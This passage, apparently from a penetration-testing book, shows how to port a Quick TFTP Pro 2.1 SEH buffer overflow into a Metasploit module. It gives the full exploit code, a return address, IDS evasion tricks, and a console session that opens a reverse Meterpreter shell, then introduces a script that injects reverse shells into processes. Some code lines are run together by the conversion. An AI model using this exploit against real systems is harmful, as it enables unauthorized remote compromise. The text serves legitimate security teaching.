Pro 2.1 Long Mode Buffer Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 155pt;text-indent: 0pt;line-height: 11pt;text-align: left;">This module exploits a stack overflow in Quick TFTP Pro 2.1.</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;line-height: 10pt;text-align: left;">},</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">&#39;Author&#39; =&gt; &#39;Your Name&#39;, &#39;Version&#39; =&gt; &#39;$Revision: 7724 $&#39;, &#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 155pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 189pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[&#39;CVE&#39;, &#39;2008-1610&#39;],</p><p class="s25" style="padding-left: 189pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[&#39;OSVDB&#39;, &#39;43784&#39;],</p><p class="s25" style="padding-left: 189pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/5315%27" class="s34" target="_blank">[&#39;URL&#39;, </a>&#39;http://www.exploit-db.com/exploits/5315&#39;],</p><p class="s25" style="padding-left: 155pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: center;">{</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">},</p><p class="s25" style="padding-top: 3pt;padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">&#39;Payload&#39;       =&gt;</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: center;">{</p><p class="s25" style="padding-left: 185pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Space&#39; =&gt; 412,</p><p class="s25" style="padding-left: 185pt;text-indent: 0pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x20\x0a\x0d&quot;, &#39;StackAdjustment&#39; =&gt; -3500,</p><p class="s25" style="padding-left: 155pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-left: 155pt;text-indent: -29pt;text-align: left;">&#39;Targets&#39; =&gt; [</p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;line-height: 10pt;text-align: center;">[ &#39;Windows XP SP2&#39;,    { &#39;Ret&#39; =&gt; 0x41414141 } ],</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">],</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">&#39;Privileged&#39; =&gt; true, &#39;DefaultTarget&#39; =&gt; 0,</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;Mar 3 2008&#39;))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 129pt;text-indent: 0pt;text-align: left;"><span class="s30">@</span>register_options([<span class="s24">Opt::RPORT(69)</span>], self.class)</p><p class="s25" style="padding-top: 7pt;padding-left: 66pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect_udp</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">print_status(&quot;Trying target #{target.name}...&quot;)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">O<span class="s24">udp_sock.put(sploit)</span></p><p class="s25" style="padding-top: 7pt;padding-left: 95pt;text-indent: 0pt;line-height: 11pt;text-align: left;">disconnect_udp</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_617.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 83%;text-align: left;">Because this exploit uses the Trivial File Transfer Protocol (TFTP), we need to include the <span class="s25">Msf::Exploit::Remote::Udp </span>mixin shown at <span class="s32">O</span>. And because it manipulates the structured exception handler, we also need to include the <span class="s25">Msf::Exploit::Remote::Seh </span>mixin shown at <span class="s32">8 </span>to gain access to certain functions that deal with SEH overflows. Because TFTP servers typically listen on UDP port 69, we declare that port at <span class="s32">@ </span>as the default for the module. Lastly, once</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">the malicious string is built, the code is put on the wire at <span class="s32">O</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">We begin by using the same skeleton from our original Python exploit</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">earlier in this chapter for the TFTP exploit. We will be adding the major parts of it into our exploit section.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect_udp</p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;line-height: 21pt;text-align: left;">print_status(&quot;Trying target #{target.name}...&quot;) evil = &quot;\x41&quot; * 1019</p><p class="s30" style="padding-left: 111pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O<span class="s24">evil &lt;&lt; &quot;\xeb\x08\x90\x90&quot; </span><span class="s25"># Short Jump</span></p><p class="s30" style="padding-left: 120pt;text-indent: -8pt;line-height: 80%;text-align: left;">8<span class="s24">evil &lt;&lt; &quot;\x58\x14\xd3\x74&quot; </span><span class="s25"># POP-POP-RETN evil &lt;&lt; &quot;\x90&quot; * 16 # NOP slide</span></p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;text-align: left;">evil &lt;&lt; &quot;\xcc&quot; * 412 # Dummy Shellcode</p><p class="s30" style="padding-top: 2pt;padding-left: 120pt;text-indent: -8pt;line-height: 88%;text-align: left;">@<span class="s25">sploit = &quot;\x00\x02&quot; sploit &lt;&lt; &quot;pwnd&quot; sploit &lt;&lt; &quot;\x00&quot;</span></p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;text-align: left;">sploit &lt;&lt; evil sploit &lt;&lt; &quot;\x00&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 120pt;text-indent: 0pt;text-align: left;">udp_sock.put(sploit)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 120pt;text-indent: 0pt;line-height: 11pt;text-align: left;">disconnect_udp</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_618.png"/></span></p><p style="padding-top: 9pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">Following the initial string of <span class="s19">A</span>s (1019 of them, represented by <span class="s25">\x41 </span>in hexa- decimal), we add a short jump at <span class="s32">O </span>to overwrite the Next SE Handler (NSEH). At the beginning of this chapter, we used a simple stack overflow example when</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 92%;text-align: left;">we attacked MailCarrier and overwrote the instruction pointer. Here, we over- write the SEH and the NSEH to break out of the structured exception handler. Then at <span class="s32">8 </span>we add the address of a <span class="s19">POP-POP-RETN </span>sequence of instructions to</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">overwrite SEH, which puts us into an area of memory that we control.</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">Next, to make sure that the packet will be recognized as a write request by the TFTP server, we append <span class="s25">\x00\x02 </span>after the shellcode at <span class="s32">@</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Now, when we load the module and run it against our target, our debugger</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">should pause with a SEH overwrite, as shown in Figure 15-4.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="257" height="150" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_619.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 15-4: Quick TFTP&#39;s initial SEH overwrite</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Because that long string of <span class="s19">A</span>s and the NOP slide sent to the application will set off IDS alarms, we’ll replace the <span class="s19">A</span>s (as in the previous example) with a random selection of uppercase alphabetic characters, and replace the <span class="s25">\x90 </span>characters with NOP equivalents, as shown in the following boldface code:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_620.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">evil = <span class="s24">rand_text_alpha_upper(1019</span>) # Was: &quot;\x41&quot; * 1019 evil &lt;&lt; &quot;\xeb\x08\x90\x90&quot; # Short Jump</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">evil &lt;&lt; &quot;\x58\x14\xd3\x74&quot; # pop/pop/ret</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">evil &lt;&lt; <span class="s24">make_nops(16) </span># Was: &quot;\x90&quot; * 16 # NOP slide</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">evil &lt;&lt; &quot;\xcc&quot; * 412 # Dummy Shellcode</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_621.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">As always, it’s a good idea to check your new module’s functionality after every change. As you can see in Figure 15-5, the random characters have been accepted by the application and SEH is still controlled as it was before.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="257" height="149" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_622.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 15-5: Quick TFTP buffer with random characters</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that we know that the module is still behaving properly, we can set the return address in the <span class="s25">&#39;Targets&#39; </span>definition. The address in this example is a <span class="s19">POP-POP-RETN </span>from <span class="s19">oledlg.dll</span>, as in the original exploit. Remember that if we can find a memory instruction set in the same application that is loaded every time, we can create a universal exploit that is not dependent on Microsoft DLLs and that can target every operating system. In this case, we use <span class="s19">oledlg.dll </span>to make this exploit universal.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_623.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Targets&#39; =&gt;</p><p class="s25" style="padding-left: 115pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s30" style="padding-left: 150pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O<span class="s25">[ &#39;Windows XP SP2&#39;, { &#39;Ret&#39; =&gt; 0x74d31458 } ], # p/p/r oledlg</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 115pt;text-indent: 0pt;line-height: 10pt;text-align: left;">],</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_624.png"/></span></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;line-height: 84%;text-align: left;">We now have our target of Windows XP SP2 and a return address of 0x74d31458, as shown at <span class="s32">O</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Next, we create a random, alphabetical, uppercase string of 1019 bytes:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_625.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">evil = rand_text_alpha_upper(1019)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">evil &lt;&lt; <span class="s24">generate_seh_payload</span>(target.ret) evil &lt;&lt; make_nops(16)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_626.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The <span class="s25">generate_seh_payload </span>function uses the declared return address and will automatically insert the short jump (which jumps us over the SEH han- dler). The <span class="s25">generate_seh_payload </span>function calculates the jumps for us, so it will go straight to the <span class="s19">POP-POP-RETN</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We run the module one last time with the dummy shellcode and see that our debugger contains numerous random characters, but everything is still under our direct control, as shown in Figure 15-6. Random characters can be better than NOPs in some cases, because they serve to trip up many IDSs that may be monitoring the network. Many signature-based IDSs can trigger over large volumes of NOPs.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="260" height="150" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_627.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 15-6: Quick TFTP fully controlled</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we remove the dummy shellcode and run the module with a real payload to get our shell, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_628.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use exploit/windows/tftp/quicktftp_book</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(quicktftp_book) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(quicktftp_book) &gt; <span class="s24">set LHOST 192.168.1.101</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 192.168.1.101</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(quicktftp_book) &gt; <span class="s24">set RHOST 192.168.1.155</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">RHOST =&gt; 192.168.1.155</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(quicktftp_book) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.1.101:4444 [*] Trying target Windows XP SP2...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (747008 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Meterpreter session 2 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1036) meterpreter &gt; <span class="s24">getuid</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Server username: V-XP-SP2-BARE\Administrator</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_629.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that we have our Meterpreter shell, we’ve successfully ported an exploit and used the Framework in an SEH exploit!</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_630.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">require &#39;msf/core&#39;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 69pt;text-indent: -33pt;text-align: left;">class Metasploit3 &lt; Msf::Exploit::Remote include Msf::Exploit::Remote::Udp include Msf::Exploit::Remote::Seh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def initialize(info = {})</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;line-height: 11pt;text-align: left;">super(update_info(info,</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;text-align: left;">&#39;Name&#39; =&gt; &#39;Quick TFTP Pro 2.1 Long Mode Buffer Overflow&#39;, &#39;Description&#39; =&gt; %q{</p><p class="s25" style="padding-left: 169pt;text-indent: 0pt;line-height: 11pt;text-align: left;">This module exploits a stack overflow in Quick TFTP Pro 2.1.</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-top: 3pt;padding-left: 136pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Author&#39; =&gt; &#39;Your Name&#39;,</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;Version&#39; =&gt; &#39;$Revision: 7724 $&#39;,</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&#39;References&#39; =&gt;</p><p class="s25" style="padding-left: 169pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[&#39;CVE&#39;, &#39;2008-1610&#39;],</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[&#39;OSVDB&#39;, &#39;43784&#39;],</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><a href="http://www.exploit-db.com/exploits/5315%27" class="s34" target="_blank">[&#39;URL&#39;, </a>&#39;http://www.exploit-db.com/exploits/5315&#39;],</p><p class="s25" style="padding-left: 169pt;text-indent: 0pt;line-height: 11pt;text-align: left;">],</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;DefaultOptions&#39; =&gt;</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: center;">{</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;EXITFUNC&#39; =&gt; &#39;thread&#39;,</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">},</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 10pt;text-align: center;">&#39;Payload&#39;       =&gt;</p><p class="s25" style="text-indent: 0pt;line-height: 11pt;text-align: center;">{</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Space&#39; =&gt; 412,</p><p class="s25" style="padding-left: 207pt;text-indent: 0pt;text-align: left;">&#39;BadChars&#39; =&gt; &quot;\x00\x20\x0a\x0d&quot;, &#39;StackAdjustment&#39; =&gt; -3500,</p><p class="s25" style="padding-left: 169pt;text-indent: 0pt;line-height: 11pt;text-align: left;">},</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&#39;Platform&#39; =&gt; &#39;win&#39;,</p><p class="s25" style="padding-left: 169pt;text-indent: -33pt;text-align: left;">&#39;Targets&#39; =&gt; [</p><p class="s25" style="padding-left: 197pt;text-indent: 0pt;line-height: 10pt;text-align: center;">[ &#39;Windows XP SP2&#39;,     { &#39;Ret&#39; =&gt; 0x74d31458 } ],</p><p class="s25" style="padding-left: 83pt;text-indent: 0pt;line-height: 10pt;text-align: center;"># p/p/r oledlg</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">],</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;text-align: left;">&#39;Privileged&#39; =&gt; true, &#39;DefaultTarget&#39; =&gt; 0,</p><p class="s25" style="padding-left: 136pt;text-indent: 0pt;line-height: 193%;text-align: left;">&#39;DisclosureDate&#39; =&gt; &#39;Mar 3 2008&#39;)) register_options([Opt::RPORT(69)], self.class)</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">def exploit</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;line-height: 11pt;text-align: left;">connect_udp</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;line-height: 21pt;text-align: left;">print_status(&quot;Trying target #{target.name}...&quot;) evil = rand_text_alpha_upper(1019)</p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">evil &lt;&lt; generate_seh_payload(target.ret) evil &lt;&lt; make_nops(16)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">sploit = &quot;\x00\x02&quot; sploit &lt;&lt; &quot;pwnd&quot; sploit &lt;&lt; &quot;\x00&quot; sploit &lt;&lt; evil sploit &lt;&lt; &quot;\x00&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 103pt;text-indent: 0pt;text-align: left;">udp_sock.put(sploit)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-left: 103pt;text-indent: 0pt;line-height: 11pt;text-align: left;">disconnect_udp</p><p class="s25" style="padding-left: 69pt;text-indent: 0pt;line-height: 11pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_631.png"/></span></p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark411">Wrapping Up</a><a name="bookmark428">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">This chapter was designed to help you understand how to port different stand-alone exploits into the Metasploit Framework. You can import into the Framework in a number of ways, and different exploits will require different approaches and techniques.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">At the beginning of this chapter, you learned how to use some basic assembly instructions to perform a simple stack overflow and port it into the Framework. We moved on to SEH overwrites, which we were able to use to maneuver around the handler and gain remote code execution. We used a <span class="s19">pop/pop/ret </span>technique to gain the ability to execute code remotely, and we used Metasploit to open a Meterpreter shell.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">In the next chapter, we will begin to dive into the Meterpreter scripting language and post exploitation modules. When we compromise a system and leverage Meterpreter, we can perform a number of additional attacks. We’ll create our own Meterpreter scripts and learn how the Framework is structured and how use it to maximum effect.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="134" height="123" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_632.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 121pt;text-indent: 0pt;text-align: left;"><a name="bookmark429">METERPRETER SCRIPTING </a><a name="bookmark438">&zwnj;</a><a name="bookmark439">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit’s powerful scripting environment lets you add features or options to Meterpreter. In this chapter, you’ll learn the basics of Meterpreter scripting, some useful native calls, and learn how to run these com- mands from within Meterpreter. We’ll cover two ways</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">to leverage Meterpreter scripting. The first method is somewhat outdated but still important, because not all scripts have been converted. The second method is nearly identical to the one discussed in Chapter 13, so we won’t cover it in detail in this chapter. (Special thanks to Carlos Perez [darkoperator] for his contributions to this chapter.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark430">Meterpreter Scripting Basics</a><a name="bookmark440">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">All Meterpreter scripts are located under the Framework root under <span class="s19">scripts/ meterpreter/</span>. To show a listing of all scripts, press the <span class="s9">TAB </span>key in a Meterpreter shell, enter <span class="s24">run</span>, and press <span class="s9">TAB </span>again.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Let’s dissect a simple Meterpreter script and then build our own. We’ll explore the <span class="s25">multi_meter_inject </span>script that injects Meterpreter shells into</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">different processes. To begin, take a look at this script in Meterpreter to see what flags and syntax are included:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_633.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run multi_meter_inject -h</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 87%;text-align: left;">Meterpreter script for injecting a reverse tcp Meterpreter payload into memory space of multiple PID&#39;s. If none is provided, notepad.exe will be spawned and the meterpreter payload injected into it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">OPTIONS:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-h Help menu.</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 12pt;text-align: left;">-m <span class="s30">O </span>Start Exploit multi/handler for return connection</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-mp <span class="s30">8</span>&lt;opt&gt; Provide Multiple PID for connections separated by comma one per IP.</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-mr <span class="s30">@</span>&lt;opt&gt; Provide Multiple IP Addresses for Connections separated by comma.</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 11pt;text-align: left;">-p <span class="s30">O</span>&lt;opt&gt; The port on the remote host where Metasploit is listening (default: 4444)</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-pt &lt;opt&gt; Specify Reverse Connection Meterpreter Payload. Default windows/</p><p class="s25" style="padding-left: 125pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter/reverse_tcp</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_634.png"/></span></p><p style="padding-top: 5pt;padding-left: 90pt;text-indent: 18pt;line-height: 81%;text-align: left;">The first option is the <span class="s25">-m </span>flag <span class="s32">O</span>, which automatically sets up a new handler for us on the return connection. We would not need to set this option if we</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 84%;text-align: right;">were going to use the same port (for example, 443). Next we specify the pro- cess IDs (PIDs) <span class="s32">8 </span>that 